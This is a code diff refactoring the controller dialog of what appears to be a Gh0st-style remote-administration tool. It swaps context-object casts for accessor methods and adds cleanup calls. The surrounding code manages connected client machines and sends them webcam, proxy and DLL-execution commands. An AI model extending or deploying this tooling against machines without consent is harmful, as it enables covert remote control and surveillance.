@@ -1036,8 +1036,9 @@ void CMy2015RemoteDlg::Release(){
 	int n = m_CList_Online.GetItemCount();
 	for(int Pos = 0; Pos < n; ++Pos) 
 	{
-		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(Pos);
+		context* ContextObject = (context*)m_CList_Online.GetItemData(Pos);
 		ContextObject->Send2Client( &bToken, sizeof(BYTE));
+		ContextObject->Destroy();
 	}
 	LeaveCriticalSection(&m_cs);
 	Sleep(500);
@@ -1436,10 +1437,10 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 	while(Pos)
 	{
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
-		if (!ContextObject->bLogin && szBuffer[0] != COMMAND_BYE)
+		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+		if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
 			continue;
-		if (szBuffer[0]== COMMAND_WEBCAM && ContextObject->sClientInfo[ONLINELIST_VIDEO] == CString("无"))
+		if (szBuffer[0]== COMMAND_WEBCAM && ContextObject->GetClientData(ONLINELIST_VIDEO) == CString("无"))
 		{
 			continue;
 		}
@@ -1632,8 +1633,10 @@ BOOL CMy2015RemoteDlg::Activate(const std::string& nPort,int nMaxConnection)
 
 VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 {
-	if (!g_2015RemoteDlg)
+	if (!g_2015RemoteDlg || g_2015RemoteDlg->isClosed) {
+		ContextObject->Destroy();
 		return;
+	}
 
 	AUTO_TICK(50);
 
@@ -1771,6 +1774,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 	}
 	case TOKEN_HEARTBEAT: case 137:
 		UpdateActiveWindow(ContextObject);
+		ContextObject->Destroy();
 		break;
 	case SOCKET_DLLLOADER: {// 请求DLL
 		auto len = ContextObject->InDeCompressedBuffer.GetBufferLength();
@@ -1890,16 +1894,12 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 
 	try
 	{
-		sockaddr_in  ClientAddr;
-		memset(&ClientAddr, 0, sizeof(ClientAddr));
-		int iClientAddrLen = sizeof(sockaddr_in);
-		SOCKET nSocket = ContextObject->sClientSocket;
-		BOOL bOk = getpeername(nSocket, (SOCKADDR*)&ClientAddr, &iClientAddrLen);
+		strIP = ContextObject->GetPeerName().c_str();
 		// 不合法的数据包
 		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
 		{
 			char buf[100];
-			sprintf_s(buf, "*** Received [%s] invalid login data! ***\n", inet_ntoa(ClientAddr.sin_addr));
+			sprintf_s(buf, "*** Received [%s] invalid login data! ***\n", strIP.GetString());
 			Mprintf(buf);
 			return -1;
 		}
@@ -1912,7 +1912,6 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 		if (!ContextObject->bLogin) {
 			Mprintf("*** Received master '%s' client! ***\n", LoginInfor->szMasterID);
 		}
-		strIP = inet_ntoa(ClientAddr.sin_addr);
 
 		//主机名称
 		strPCName = LoginInfor->szPCName;
@@ -1934,7 +1933,7 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 
 		strVideo = m_settings.DetectSoftware ? "无" : LoginInfor->bWebCamIsExist ? "有" : "无";
 
-		strAddr.Format("%d", nSocket);
+		strAddr.Format("%d", ContextObject->GetPort());
 		auto v = LoginInfor->ParseReserved(RES_MAX);
 		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime, v, ContextObject);
 		delete LoginInfor;
@@ -1993,10 +1992,10 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
 
 	CLock L(m_cs);
 	int n = m_CList_Online.GetItemCount();
-	DWORD_PTR cur = (DWORD_PTR)ctx;
+	context* cur = (context*)ctx;
 	for (int i = 0; i < n; ++i) {
-		DWORD_PTR id = m_CList_Online.GetItemData(i);
-		if (id == cur) {
+		context* id = (context*)m_CList_Online.GetItemData(i);
+		if (cur->IsEqual(id)) {
 			m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
 			if (hb.Ping > 0)
 				m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
@@ -2018,8 +2017,8 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
 		EnterCriticalSection(&m_cs);
 		for (int i=0, n=m_CList_Online.GetItemCount(); i<n; ++i)
 		{
-			CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(i);
-			if (!ContextObject->bLogin)
+			context* ContextObject = (context*)m_CList_Online.GetItemData(i);
+			if (!ContextObject->IsLogin())
 				continue;
 			ContextObject->Send2Client(buf, sizeof(buf));
 		}
@@ -2198,7 +2197,7 @@ void CMy2015RemoteDlg::OnMainProxy()
 	while (Pos)
 	{
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
+		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
 		BYTE cmd[] = { COMMAND_PROXY };
 		ContextObject->Send2Client( cmd, sizeof(cmd));
 		break;
@@ -2223,12 +2222,12 @@ void CMy2015RemoteDlg::OnOnlineHostnote()
 	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
 	while (Pos) {
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
-		auto f = m_ClientMap.find(ContextObject->ID);
+		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+		auto f = m_ClientMap.find(ContextObject->GetClientID());
 		if (f == m_ClientMap.end())
-			m_ClientMap[ContextObject->ID] = ClientValue("", dlg.m_str);
+			m_ClientMap[ContextObject->GetClientID()] = ClientValue("", dlg.m_str);
 		else
-			m_ClientMap[ContextObject->ID].UpdateNote(dlg.m_str);
+			m_ClientMap[ContextObject->GetClientID()].UpdateNote(dlg.m_str);
 		m_CList_Online.SetItemText(iItem, ONLINELIST_COMPUTER_NAME, dlg.m_str);
 		modified = TRUE;
 	}
@@ -2549,7 +2548,7 @@ void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID) {
 	while (Pos && menuIndex < m_DllList.size()) {
 		Buffer* buf = m_DllList[menuIndex]->Data;
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
+		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
 		ContextObject->Send2Client( buf->Buf(), 1 + sizeof(DllExecuteInfo));
 	}
 	LeaveCriticalSection(&m_cs);
@@ -2621,7 +2620,7 @@ void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
 	if (pNMItem->iItem >= 0)
 	{
 		// 获取数据
-		CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(pNMItem->iItem);
+		context* ctx = (context*)m_CList_Online.GetItemData(pNMItem->iItem);
 		CString res[RES_MAX];
 		CString startTime = ctx->GetClientData(ONLINELIST_LOGINTIME);
 		ctx->GetAdditionalData(res);
